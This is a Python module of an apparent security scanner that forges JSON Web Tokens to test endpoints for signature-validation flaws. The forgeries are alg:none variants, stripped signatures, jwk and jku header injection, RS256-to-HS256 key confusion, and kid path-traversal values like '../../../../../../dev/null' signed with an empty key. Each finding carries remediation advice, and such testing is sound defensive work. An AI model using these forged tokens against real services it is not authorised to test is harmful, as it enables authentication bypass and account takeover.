"""IdP & JWT Tampering.

v0.3 - JWT checks:
  1. alg_none              : header.alg -> "none" (every letter-case variant) + strip the signature.
  2. signature_stripped    : the same header/payload, only the signature removed.
  3. jwk_header_injection  : sign the token with a locally generated RSA key,
     embedding the public key inside a "jwk" header - detects servers that
     trust an attached key instead of their own fixed key.
  4. rs256_hs256_confusion : sign with HS256 using the known RS256 public
     key as the HMAC secret (requires known_public_key_pem from the user).
  5. expiry_claim_analysis : check whether exp is present and valid, and
     the token's lifetime.

TODO (deferred until the canary infrastructure built for the SSRF/IMDS
module is also wired in here):
  - kid header injection (path traversal / SQLi in the kid value) - active mode.
  - jku/x5u header injection (needs a canary like IMDS SSRF) - active mode.
  - missing aud/iss validation.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from dataclasses import dataclass, field

import jwt as pyjwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from wily.core.oob_canary import OOBCanaryServer
from wily.core.scope_manager import ScopeManager
from wily.scanners.base import BaseScanner, Finding
from wily.scanners.http_engine import HttpEngine


@dataclass
class JwtTarget:
    """The asset the scanner will test: a JWT-protected endpoint plus a
    valid sample token (supplied by the user, e.g. from an ordinary
    login)."""

    url: str
    sample_token: str
    method: str = "GET"
    auth_header_name: str = "Authorization"
    auth_header_prefix: str = "Bearer "
    success_indicator_status: list[int] = field(default_factory=lambda: [200])
    known_public_key_pem: str | None = None  # for RS256->HS256 confusion only
    canary_server: object | None = None  # OOBCanaryServer - enables the jku test if present


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _int_to_b64url(n: int) -> str:
    byte_length = (n.bit_length() + 7) // 8 or 1
    return _b64url_encode(n.to_bytes(byte_length, "big"))


def decode_unverified(token: str) -> tuple[dict, dict]:
    """Return (header, payload) as dicts with no signature verification."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT token (expected 3 segments)")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload


def build_alg_none_token(token: str) -> str:
    header, payload = decode_unverified(token)
    header = dict(header)
    header["alg"] = "none"
    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_header}.{new_payload}."


ALG_NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe", "nONE"]


def build_alg_none_variant_tokens(token: str) -> dict[str, str]:
    header, payload = decode_unverified(token)
    results = {}
    for variant in ALG_NONE_VARIANTS:
        h = dict(header)
        h["alg"] = variant
        new_header = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        results[variant] = f"{new_header}.{new_payload}."
    return results


def build_signature_stripped_token(token: str) -> str:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT token (expected 3 segments)")
    return f"{parts[0]}.{parts[1]}."


MAX_REASONABLE_LIFETIME_SECONDS = 24 * 60 * 60  # 24 hours


def analyze_expiry_claims(token: str) -> dict:
    """Inspect the original token's claims (no forgery involved) and
    return information about its time validity: whether it has an exp at
    all, whether it has already passed, and what its lifetime is."""
    _header, payload = decode_unverified(token)
    now = time.time()
    exp = payload.get("exp")

    if exp is None:
        return {"has_exp": False, "is_expired": None, "lifetime_seconds": None}

    return {
        "has_exp": True,
        "is_expired": exp < now,
        "lifetime_seconds": exp - now,
    }


def build_jwk_injection_token(token: str) -> tuple[str, dict]:
    """Generate an RSA key pair locally, sign the same payload with it,
    and embed the public key inside a jwk header. Returns
    (forged_token, public_jwk) - public_jwk is recorded in the evidence
    so the analyst can see exactly which key was actually used."""
    _header, payload = decode_unverified(token)

    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_numbers = private_key.public_key().public_numbers()

    public_jwk = {
        "kty": "RSA",
        "n": _int_to_b64url(public_numbers.n),
        "e": _int_to_b64url(public_numbers.e),
        "alg": "RS256",
        "use": "sig",
        "kid": "wily-jwk-injection-probe",
    }

    pem_private_key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    forged_token = pyjwt.encode(
        payload,
        pem_private_key,
        algorithm="RS256",
        headers={"jwk": public_jwk, "kid": public_jwk["kid"]},
    )
    return forged_token, public_jwk


def build_rs256_to_hs256_confusion_token(token: str, known_public_key_pem: str) -> str:
    """Manually sign the same payload with HMAC-SHA256 (not via
    pyjwt.encode), using the known public key (PEM) as the HMAC secret.
    Manual signing is required here because modern PyJWT versions
    deliberately refuse to accept a PEM-shaped key as an HS256 secret
    (built-in protection against this exact attack) - a real attacker
    doesn't need PyJWT at all to build the token bytes themselves."""
    header, payload = decode_unverified(token)
    header = dict(header)
    header["alg"] = "HS256"

    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()

    key_bytes = (
        known_public_key_pem.encode()
        if isinstance(known_public_key_pem, str)
        else known_public_key_pem
    )
    signature = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    signature_b64 = _b64url_encode(signature)

    return f"{header_b64}.{payload_b64}.{signature_b64}"


def build_jku_injection_token(token: str, jku_url: str) -> str:
    """Generate an RSA key pair locally, sign the same payload with it,
    and put the canary URL (jku_url) in the jku header instead of
    embedding the key itself in the token (the difference from
    jwk_injection). The target server - if vulnerable - will go fetch
    the key from jku_url on its own, and that is exactly what the canary
    records as real evidence."""
    _header, payload = decode_unverified(token)

    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pem_private_key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    forged_token = pyjwt.encode(
        payload,
        pem_private_key,
        algorithm="RS256",
        headers={"jku": jku_url, "kid": "wily-jku-injection-probe"},
    )
    return forged_token


KID_NULL_KEY_PAYLOADS = [
    "/dev/null",
    "../../../../../../dev/null",
    "../../../../../../../dev/null",
]


def build_kid_null_key_tokens(token: str) -> dict[str, str]:
    """Build one version of the token per payload in
    KID_NULL_KEY_PAYLOADS, signed with HS256 using an empty key (b"").
    The theory: if the code reads a file named after kid as the
    verification key (kid -> a file path on the server), a path like
    /dev/null returns empty content, and a signature with an empty key
    succeeds. A known, documented technique (jwt_tool), not a guess -
    unlike SQLi in kid, which requires knowing the database schema and
    can't be generalized."""
    header, payload = decode_unverified(token)
    results = {}
    for kid_payload in KID_NULL_KEY_PAYLOADS:
        h = dict(header)
        h["kid"] = kid_payload
        h["alg"] = "HS256"
        header_b64 = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{header_b64}.{payload_b64}".encode()
        signature = hmac.new(b"", signing_input, hashlib.sha256).digest()
        signature_b64 = _b64url_encode(signature)
        results[kid_payload] = f"{header_b64}.{payload_b64}.{signature_b64}"
    return results


class JwtTamperScanner(BaseScanner):
    name = "jwt_tamper"
    requires_tenant_pair = False
    requires_owned_infra = False

    def __init__(
        self, scope_manager: ScopeManager, http_engine: HttpEngine | None = None
    ) -> None:
        self.http = http_engine or HttpEngine(scope_manager=scope_manager)

    def _send(self, target: JwtTarget, token: str):
        headers = {target.auth_header_name: f"{target.auth_header_prefix}{token}"}
        return self.http.request(method=target.method, url=target.url, headers=headers)

    def run(self, target: JwtTarget) -> list[Finding]:
        findings: list[Finding] = []

        baseline = self._send(target, target.sample_token)
        if baseline.status_code not in target.success_indicator_status:
            return findings

        # Important guard: confirm the endpoint actually rejects requests
        # with no auth at all - otherwise it isn't JWT-protected to begin
        # with, and any forged-token "success" would be a false positive
        # (the endpoint would have returned 200 for anything regardless).
        no_auth_response = self.http.request(method=target.method, url=target.url, headers={})
        if no_auth_response.status_code in target.success_indicator_status:
            return findings  # not actually JWT-protected - stop before testing anything

        # --- test 1: alg:none (every letter-case variant) ---
        try:
            variants = build_alg_none_variant_tokens(target.sample_token)
            for variant_name, forged_token in variants.items():
                resp = self._send(target, forged_token)
                if resp.status_code in target.success_indicator_status:
                    findings.append(
                        Finding(
                            asset=target.url,
                            category="jwt-tamper-alg-none",
                            severity="critical",
                            confidence=0.95,
                            discovery_source="scanner",
                            evidence={
                                "technique": "alg_none",
                                "alg_variant": variant_name,
                                "forged_token": forged_token,
                                "response_status": resp.status_code,
                                "baseline_status": baseline.status_code,
                            },
                            remediation=(
                                "Enforce an explicit allowlist of algorithms during "
                                "validation (for example, PyJWT: "
                                "jwt.decode(token, key, algorithms=['HS256'])); "
                                "never include 'none' in any letter case."
                            ),
                        )
                    )
                    break
        except ValueError:
            pass

        # --- test 2: signature stripped ---
        try:
            stripped_token = build_signature_stripped_token(target.sample_token)
            resp = self._send(target, stripped_token)
            if resp.status_code in target.success_indicator_status:
                findings.append(
                    Finding(
                        asset=target.url,
                        category="jwt-tamper-signature-stripped",
                        severity="critical",
                        confidence=0.95,
                        discovery_source="scanner",
                        evidence={
                            "technique": "signature_stripped",
                            "forged_token": stripped_token,
                            "response_status": resp.status_code,
                            "baseline_status": baseline.status_code,
                        },
                        remediation=(
                            "Ensure the validation library explicitly rejects "
                            "unsigned tokens (verify_signature=True by default) "
                            "and prevent partial manual validation."
                        ),
                    )
                )
        except ValueError:
            pass

        # --- test 3: jwk header injection ---
        try:
            jwk_token, public_jwk = build_jwk_injection_token(target.sample_token)
            resp = self._send(target, jwk_token)
            if resp.status_code in target.success_indicator_status:
                findings.append(
                    Finding(
                        asset=target.url,
                        category="jwt-tamper-jwk-injection",
                        severity="critical",
                        confidence=0.9,
                        discovery_source="scanner",
                        evidence={
                            "technique": "jwk_header_injection",
                            "forged_token": jwk_token,
                            "injected_public_jwk": public_jwk,
                            "response_status": resp.status_code,
                            "baseline_status": baseline.status_code,
                        },
                        remediation=(
                            "Do not trust keys (jwk/jku/x5c) embedded in the "
                            "token. Validation must use only a fixed key or secret "
                            "configured server-side, without reading client-"
                            "controlled fields."
                        ),
                    )
                )
        except ValueError:
            pass

        # --- test 4: RS256->HS256 algorithm confusion (needs a known public key) ---
        if target.known_public_key_pem:
            try:
                confusion_token = build_rs256_to_hs256_confusion_token(
                    target.sample_token, target.known_public_key_pem
                )
                resp = self._send(target, confusion_token)
                if resp.status_code in target.success_indicator_status:
                    findings.append(
                        Finding(
                            asset=target.url,
                            category="jwt-tamper-rs256-hs256-confusion",
                            severity="critical",
                            confidence=0.9,
                            discovery_source="scanner",
                            evidence={
                                "technique": "rs256_hs256_confusion",
                                "forged_token": confusion_token,
                                "response_status": resp.status_code,
                                "baseline_status": baseline.status_code,
                            },
                            remediation=(
                                "Enforce a single fixed algorithm server-side "
                                "during validation (algorithms=['RS256']); do not "
                                "read alg from the client-provided header."
                            ),
                        )
                    )
            except ValueError:
                pass

        # --- test: jku header injection (active + OOB evidence) ---
        if target.canary_server is not None:
            try:
                canary = target.canary_server
                canary_token = canary.new_token()
                jku_url = canary.url_for(canary_token)

                jku_token = build_jku_injection_token(target.sample_token, jku_url)
                resp = self._send(target, jku_token)

                # Real evidence: did the target server actually go fetch the URL?
                hit = canary.wait_for_hit(canary_token, timeout=5.0)

                if hit is not None:
                    findings.append(
                        Finding(
                            asset=target.url,
                            category="jwt-tamper-jku-injection",
                            severity="critical",
                            confidence=0.98,  # an OOB hit is direct evidence, not inference
                            discovery_source="scanner",
                            evidence={
                                "technique": "jku_header_injection",
                                "forged_token": jku_token,
                                "jku_url": jku_url,
                                "oob_hit_confirmed": True,
                                "oob_hit_method": hit.method,
                                "oob_hit_remote_addr": hit.remote_addr,
                                "oob_hit_user_agent": hit.headers.get("User-Agent"),
                                "response_status": resp.status_code,
                                "baseline_status": baseline.status_code,
                            },
                            remediation=(
                                "Do not trust URLs (jku/x5u) embedded in the token. "
                                "If jku is used, enforce a strict allowlist of "
                                "trusted key-hosting domains."
                            ),
                        )
                    )
            except ValueError:
                pass

        # --- test: kid null-key (path traversal to an empty file) ---
        try:
            kid_variants = build_kid_null_key_tokens(target.sample_token)
            for kid_payload, forged_token in kid_variants.items():
                resp = self._send(target, forged_token)
                if resp.status_code in target.success_indicator_status:
                    findings.append(
                        Finding(
                            asset=target.url,
                            category="jwt-tamper-kid-null-key",
                            severity="critical",
                            confidence=0.85,
                            discovery_source="scanner",
                            evidence={
                                "technique": "kid_null_key",
                                "kid_payload": kid_payload,
                                "forged_token": forged_token,
                                "response_status": resp.status_code,
                                "baseline_status": baseline.status_code,
                            },
                            remediation=(
                                "Do not use kid directly as a filesystem path. Use a "
                                "fixed allowlist of known keys (look them up in a "
                                "dictionary/database using a constrained ID, not an "
                                "arbitrary file path)."
                            ),
                        )
                    )
                    break
        except ValueError:
            pass

        # --- test 5: expiry claims (passive - inspects claims, no forgery) ---
        # Guarded like every forged-token test above: a sample token that is
        # not a decodable JWT (e.g. an opaque session string the endpoint
        # still answers 200 for) must not crash the whole scan here - it just
        # means there are no JWT claims to analyze.
        try:
            expiry_info = analyze_expiry_claims(target.sample_token)
        except ValueError:
            return findings

        if not expiry_info["has_exp"]:
            findings.append(
                Finding(
                    asset=target.url,
                    category="jwt-missing-exp-claim",
                    severity="medium",
                    confidence=1.0,
                    discovery_source="scanner",
                    evidence={
                        "technique": "expiry_claim_analysis",
                        "has_exp": False,
                    },
                    remediation=(
                        "Add an exp claim to every JWT with a reasonable lifetime "
                        "(for example, 15-60 minutes for access tokens) and "
                        "explicitly validate it on every request."
                    ),
                )
            )
        elif expiry_info["is_expired"]:
            findings.append(
                Finding(
                    asset=target.url,
                    category="jwt-expired-token-accepted",
                    severity="critical",
                    confidence=1.0,
                    discovery_source="scanner",
                    evidence={
                        "technique": "expiry_claim_analysis",
                        "is_expired": True,
                        "baseline_status": baseline.status_code,
                    },
                    remediation=(
                        "Ensure the validation library enforces exp validation "
                        "(PyJWT does this by default unless "
                        "options={'verify_exp': False} is set)."
                    ),
                )
            )
        elif expiry_info["lifetime_seconds"] > MAX_REASONABLE_LIFETIME_SECONDS:
            findings.append(
                Finding(
                    asset=target.url,
                    category="jwt-excessive-token-lifetime",
                    severity="low",
                    confidence=0.8,
                    discovery_source="scanner",
                    evidence={
                        "technique": "expiry_claim_analysis",
                        "lifetime_hours": round(expiry_info["lifetime_seconds"] / 3600, 1),
                    },
                    remediation=(
                        "Reduce the access-token lifetime (for example, 15-60 "
                        "minutes) and use refresh tokens for longer sessions."
                    ),
                )
            )

        return findings
